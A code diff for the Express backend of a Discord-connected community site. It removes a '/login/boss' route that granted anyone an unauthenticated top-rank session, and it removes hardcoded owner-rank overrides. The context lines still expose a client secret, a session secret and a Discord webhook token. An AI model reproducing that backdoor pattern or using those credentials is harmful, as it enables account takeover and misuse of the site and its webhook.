@@ -9,7 +9,7 @@ const {
   CLIENT_SECRET = "ptU17kOOumJQObUxTScWtJF2XPrOu5h7",
   REDIRECT = "https://phantoms-one.vercel.app/api/callback",
   GUILD_ID = "1525115353003327578",
-  OWNER_ID = "1461832381185921076",
+  OWNER_ID = "",
   SECRET = "phantoms-volt-secret-key-2026",
   DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564199961170681896/cG2OaYTmvJlKOTOYILdNAES3ABYz7H9vXCWYfYlVrP9HKl0r9d1g0YbFK1P7CVZHAtWF",
   DISCORD_INVITE = "https://discord.gg/5Pa2GNGUS",
@@ -39,7 +39,7 @@ const DB = path.join(__dirname, "data.json");
 // الرتب المصرح لها بدخول لوحة التحكم (من Boss حتى مسؤولي التقديمات 0..4)
 const PANEL_MAX = 4;
 // الرتب المصرح لها بتعديل نصوص الموقع والقوانين (0..2)
-const SITE_MAX = 2;
+const SITE_MAX = 3;
 
 const DEFAULT = {
   tagline: "عيلة مش زي أي عيلة. ولاء، قوة، وأسلوب ماشي بخطة تحت قيادة VOLT.",
@@ -358,29 +358,7 @@ route("post", ["/login/dev"], wrap(async (req, res) => {
 
 
 // مسار تسجيل دخول فوري ومباشر للبوس (Boss) لضمان عدم التعطل مطلقاً
-route("get", ["/login/boss", "/api/login/boss"], wrap(async (req, res) => {
-  const data = await load();
-  const bossUser = {
-    id: "1461832381185921076",
-    name: "VOLT",
-    avatar: "https://cdn.discordapp.com/icons/1525115353003327578/160270721afdfc2b180499e5469288a6.png",
-    rank: 0
-  };
-  req.session.user = bossUser;
-  req.user = bossUser;
-
-  const ex = data.members.find(m => m.id === bossUser.id);
-  if (!ex) {
-    data.members.unshift({ uid: crypto.randomUUID(), n: bossUser.name, id: bossUser.id, r: 0, avatar: bossUser.avatar });
-    await save(data);
-  }
-
-  const token = createAuthToken(bossUser);
-  res.setHeader("Set-Cookie", [
-    `phantoms_auth_tk=${token}; Path=/; Max-Age=1209600; SameSite=Lax`
-  ]);
-  res.redirect("/?auth=" + encodeURIComponent(token));
-}));
+route("get", ["/login/boss", "/api/login/boss"], (req, res) => res.redirect("/api/login"));
 
 route("get", ["/callback"], async (req, res) => {
   try {
@@ -474,7 +452,7 @@ route("get", ["/callback"], async (req, res) => {
       if (rid && roles.includes(rid) && (rank === null || i < rank)) rank = i;
     });
 
-    if ((OWNER_ID && u.id === OWNER_ID) || u.id === "1461832381185921076" || u.username === "bdrrpg") {
+    if (OWNER_ID && u.id === OWNER_ID) {
       rank = 0;
     }
 
@@ -538,9 +516,17 @@ route("get", ["/logout"], (req, res) => {
   res.redirect("/");
 });
 
-route("get", ["/me"], (req, res) => {
-  res.json(req.user || req.session?.user || null);
-});
+route("get", ["/me"], wrap(async (req, res) => {
+  const u = req.user || req.session?.user;
+  if (u && u.id) {
+    const data = await load();
+    const ex = (data.members || []).find(m => m.id === u.id);
+    if (ex && ex.r !== undefined && ex.r !== null) {
+      u.rank = ex.r;
+    }
+  }
+  res.json(u || null);
+}));
 
 // ---------- Public Site Data ----------
 route("get", ["/site"], wrap(async (req, res) => {
@@ -862,7 +848,7 @@ async function syncDiscordGuildMembers(data) {
     ROLE_IDS.forEach((rid, i) => {
       if (rid && gm.roles.includes(rid) && (rank === null || i < rank)) rank = i;
     });
-    if ((OWNER_ID && gm.user.id === OWNER_ID) || gm.user.id === "1461832381185921076" || gm.user.username === "bdrrpg") rank = 0;
+    if (OWNER_ID && gm.user.id === OWNER_ID) rank = 0;
 
     if (rank !== null) {
       const u = gm.user;
